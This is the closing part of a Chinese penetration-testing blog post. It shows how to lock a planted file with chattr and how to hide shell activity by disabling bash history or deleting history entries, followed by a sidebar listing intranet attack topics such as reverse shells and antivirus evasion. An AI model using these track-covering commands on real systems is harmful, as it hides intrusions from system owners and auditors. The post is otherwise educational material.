<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.txt 锁定文件</span><br><span class="line">lsattr  evil.txt   属性查看</span><br><span class="line">chattr -i evil.txt 解除锁定</span><br><span class="line">rm -rf <span class="number">1.</span>evil.txt 删除文件</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996109-765620-image.png" alt="img"></p>
<h3 id="4-隐藏历史操作记录"><a href="#4-隐藏历史操作记录" class="headerlink" title="4.隐藏历史操作记录"></a>4.隐藏历史操作记录</h3><p>临时禁用历史命令记录功能</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> +o history</span><br></pre></td></tr></table></figure>

<p>注意在 set 命令前有一个空格</p>
<p>如果想某条命令不记录到 history 中，直接在命令前加上空格就行</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996121-804645-image.png" alt="img"></p>
<p>或者先 grep 看下要删除的文件行，再 -d 指定行即可删除</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">history | grep <span class="string">&quot;key&quot;</span></span><br><span class="line">history -d <span class="number">11</span></span><br></pre></td></tr></table></figure>

<p>除此之外，还有在文件前加上 . 实现隐藏文件以及端口复用.进程隐藏等等方法。</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag"># web渗透</a>
              <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"># 内网</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/03/04/OWASP-TOP10/" rel="prev" title="owasp top10">
      <i class="fa fa-chevron-left"></i> owasp top10
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/03/11/%E7%BA%A2%E9%98%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%93%E7%82%B9checklist/" rel="next" title="外网信息收集">
      外网信息收集 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">内网基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="nav-text">名词解释</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">内网信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%EF%BC%9A%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">一：工作组信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%EF%BC%8C%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">1. 查询网络配置，版本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="nav-text">2. 查询用户列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8"><span class="nav-text">3. 查看进程列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8F%8A%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">4. 查看操作系统及安装软件版本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%9F%A5%E8%AF%A2%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8"><span class="nav-text">5. 查询端口列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E6%9F%A5%E7%9C%8B%E8%A1%A5%E4%B8%81%E5%88%97%E8%A1%A8"><span class="nav-text">6. 查看补丁列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB"><span class="nav-text">7. 查询本机共享</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E5%85%B3%E4%BA%8E%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE"><span class="nav-text">8. 关于防火墙配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-%E6%9F%A5%E8%AF%A2%E5%B9%B6%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E3%80%82"><span class="nav-text">9. 查询并开启远程连接服务。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="nav-text">10. 查询当前权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-%E6%9F%A5%E8%AF%A2%E8%B7%AF%E7%94%B1%E8%A1%A8"><span class="nav-text">11.查询路由表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-%E5%85%B6%E5%AE%83%E6%9F%A5%E8%AF%A2"><span class="nav-text">12.其它查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="nav-text">13.一些工具使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%EF%BC%9A%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">二：域内信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E5%9F%9F"><span class="nav-text">1. 判断是否有域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%8E%A2%E6%B5%8B"><span class="nav-text">2. 域内存活主机的探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%9F%9F%E5%86%85%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">3. 域内基础信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E6%8E%A7"><span class="nav-text">4. 查询域控</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E4%B8%8E%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-text">5. 查询域内用户与管理员</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%EF%BC%9A%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-text">三：定位域管理员</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="nav-text">1. 定位域管理员的工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%EF%BC%9A%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E8%BF%9B%E7%A8%8B"><span class="nav-text">四：查找域管理进程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%9C%AC%E6%9C%BA%E6%A3%80%E6%9F%A5"><span class="nav-text">1. 本机检查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BC%9A%E8%AF%9D-%E8%84%9A%E6%9C%AC"><span class="nav-text">2. 查询域控制器的域用户会话(脚本)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%89%AB%E6%8F%8F%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%8A%E8%BF%90%E8%A1%8C%E7%9A%84%E4%BB%BB%E5%8A%A1"><span class="nav-text">3. 扫描远程系统上运行的任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%89%AB%E6%8F%8F%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%8ANetBIOS%E4%BF%A1%E6%81%AF"><span class="nav-text">4. 扫描远程系统上NetBIOS信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%EF%BC%9APowershell%E6%94%B6%E9%9B%86%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">五：Powershell收集域信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Powershell%E5%9B%9B%E7%A7%8D%E6%9D%83%E9%99%90"><span class="nav-text">1. Powershell四种权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Powershell%E6%94%B6%E9%9B%86%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">2. Powershell收集域信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7BloodHound%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">六：域渗透分析工具BloodHound的使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BB%8B%E7%BB%8D"><span class="nav-text">1.介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%AE%89%E8%A3%85"><span class="nav-text">2.安装</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Java"><span class="nav-text">Java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Neo4j"><span class="nav-text">Neo4j</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BloodHound"><span class="nav-text">BloodHound</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8"><span class="nav-text">3.使用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-text">隐藏通信隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">一.隐藏通信隧道基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%A6%82%E8%BF%B0"><span class="nav-text">1. 隐藏通信隧道概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A4%E6%96%AD%E5%86%85%E7%BD%91%E7%9A%84%E8%BF%9E%E9%80%9A%E6%80%A7"><span class="nav-text">2. 判断内网的连通性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-ICMP%E5%8D%8F%E8%AE%AE"><span class="nav-text">2.1 ICMP协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-TCP%E5%8D%8F%E8%AE%AE"><span class="nav-text">2.2 TCP协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-HTTP%E5%8D%8F%E8%AE%AE"><span class="nav-text">2.3 HTTP协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-DNS%E5%8D%8F%E8%AE%AE"><span class="nav-text">2.4 DNS协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">2.5 代理服务器</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-text">二.网络层隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-IPv6%E9%9A%A7%E9%81%93"><span class="nav-text">1. IPv6隧道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-ICMP%E9%9A%A7%E9%81%93"><span class="nav-text">2. ICMP隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BB%8B%E7%BB%8D-1"><span class="nav-text">1) 介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%BB%BA%E7%AB%8B-ICMP-%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7"><span class="nav-text">2) 建立 ICMP 隧道工具</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ptunnel"><span class="nav-text">ptunnel</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#icmpsh"><span class="nav-text">icmpsh</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#icmptunnel"><span class="nav-text">icmptunnel</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1ICMP%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">3. 防御ICMP隧道攻击的方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-text">三.传输层隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">1. lcx端口转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-netcat"><span class="nav-text">2. netcat</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-%E5%AE%89%E8%A3%85"><span class="nav-text">2.1 安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0"><span class="nav-text">2.2 简单使用参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-%E8%8E%B7%E5%8F%96Shell"><span class="nav-text">2.3 获取Shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%AD%E6%B2%A1%E6%9C%89nc%E6%97%B6%E8%8E%B7%E5%8F%96%E5%8F%8D%E5%90%91Shell"><span class="nav-text">2.4 在目标主机中没有nc时获取反向Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-4-1-python%E5%8F%8D%E5%90%91Shell"><span class="nav-text">2.4.1 python反向Shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-4-2-bash%E5%8F%8D%E5%90%91Shell"><span class="nav-text">2.4.2 bash反向Shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-4-3-PHP%E5%8F%8D%E5%90%91Shell"><span class="nav-text">2.4.3 PHP反向Shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-4-4-perl%E5%8F%8D%E5%90%91Shell"><span class="nav-text">3.4.4 perl反向Shell</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="nav-text">2.5 内网代理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-PowerCat"><span class="nav-text">3. PowerCat</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-%E4%B8%8B%E8%BD%BDPowerCat"><span class="nav-text">3.1 下载PowerCat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-text">3.2 测试环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-%E9%80%9A%E8%BF%87nc%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5PowerCat"><span class="nav-text">3.3 通过nc正向连接PowerCat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-%E9%80%9A%E8%BF%87nc%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5PowerCat"><span class="nav-text">3.4 通过nc反向连接PowerCat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-5-%E9%80%9A%E8%BF%87PowerCat%E8%BF%94%E5%9B%9EPowerShell"><span class="nav-text">3.5 通过PowerCat返回PowerShell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-6-%E9%80%9A%E8%BF%87PowerCat%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6"><span class="nav-text">3.6 通过PowerCat传输文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-7-%E7%94%A8PowerCat%E7%94%9F%E6%88%90Payload%EF%BC%88%E8%BA%B2%E9%81%BF%E6%9D%80%E8%BD%AF%EF%BC%89"><span class="nav-text">3.7 用PowerCat生成Payload（躲避杀软）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-8-PowerCat-DNS%E9%9A%A7%E9%81%93"><span class="nav-text">3.8 PowerCat DNS隧道</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-9-%E5%B0%86PowerCat%E4%BD%9C%E4%B8%BA%E8%B7%B3%E6%9D%BF"><span class="nav-text">3.9 将PowerCat作为跳板</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B-%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-text">四.应用层隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-SSH%E9%9A%A7%E9%81%93"><span class="nav-text">1. SSH隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-SSH%E7%AE%80%E4%BB%8B"><span class="nav-text">1.1 SSH简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">1.2 本地端口转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">1.3 远程端口转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-4-%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="nav-text">1.4 动态转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-%E9%98%B2%E5%BE%A1SSH%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="nav-text">1.5 防御SSH隧道攻击的思路</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-HTTP-x2F-HTTPS%E5%8D%8F%E8%AE%AE"><span class="nav-text">2. HTTP&#x2F;HTTPS协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-%E7%AE%80%E4%BB%8B"><span class="nav-text">2.1 简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="nav-text">2.2 攻击步骤：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-%E9%98%B2%E5%BE%A1"><span class="nav-text">2.3 防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-DNS%E5%8D%8F%E8%AE%AE"><span class="nav-text">3. DNS协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-DNS%E9%9A%A7%E9%81%93%E7%AE%80%E4%BB%8B"><span class="nav-text">3.1 DNS隧道简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="nav-text">3.2 常用工具及攻击过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-%E9%98%B2%E5%BE%A1DNS%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">3.3 防御DNS隧道攻击的方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94-SOCKS%E4%BB%A3%E7%90%86"><span class="nav-text">五.SOCKS代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-SOCKS%E4%BB%A3%E7%90%86%E7%AE%80%E4%BB%8B"><span class="nav-text">1. SOCKS代理简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%B8%B8%E7%94%A8%E7%9A%84SOCKS%E5%B7%A5%E5%85%B7"><span class="nav-text">2. 常用的SOCKS工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD-%E5%8E%8B%E7%BC%A9%E6%95%B0%E6%8D%AE"><span class="nav-text">六.压缩数据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-RAR"><span class="nav-text">1. RAR</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-%E4%BB%A5rar%E6%A0%BC%E5%BC%8F%E5%8E%8B%E7%BC%A9-x2F-%E8%A7%A3%E5%8E%8B"><span class="nav-text">1.1 以rar格式压缩&#x2F;解压</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-%E5%88%86%E5%8D%B7%E5%8E%8B%E7%BC%A9-x2F-%E8%A7%A3%E5%8E%8B"><span class="nav-text">1.2 分卷压缩&#x2F;解压</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Zip"><span class="nav-text">2. 7-Zip</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E4%B8%8B%E8%BD%BD"><span class="nav-text">七.文件上传与下载</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%A9%E7%94%A8FTP%E4%B8%8A%E4%BC%A0"><span class="nav-text">1. 利用FTP上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8VBS%E4%B8%8A%E4%BC%A0"><span class="nav-text">2. 利用VBS上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8Debug%E4%B8%8A%E4%BC%A0"><span class="nav-text">3. 利用Debug上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8Nishang%E4%B8%8A%E4%BC%A0"><span class="nav-text">4. 利用Nishang上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%88%A9%E7%94%A8bitsadmin%E4%B8%8B%E8%BD%BD"><span class="nav-text">5. 利用bitsadmin下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8Powershell%E4%B8%8B%E8%BD%BD"><span class="nav-text">6. 利用Powershell下载</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB-%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="nav-text">八.一些渗透常用的工具</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="nav-text">权限提升和防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%EF%BC%9A%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="nav-text">一：系统内核溢出漏洞提权分析及防范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="nav-text">1.基本流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%85%B6%E5%AE%83%E5%B7%A5%E5%85%B7"><span class="nav-text">2.其它工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%EF%BC%9A-Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="nav-text">二： Windows操作系统配置错误</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="nav-text">1.系统服务权限配置错误</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BCAlwaysInstalledElevated"><span class="nav-text">2.注册表键值AlwaysInstalledElevated</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%8F%AF%E4%BF%A1%E4%BB%BB%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%BC%8F%E6%B4%9E"><span class="nav-text">3.可信任服务路径漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">4.自动安装配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-text">5.计划任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Empire%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97"><span class="nav-text">6.Empire内置模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" 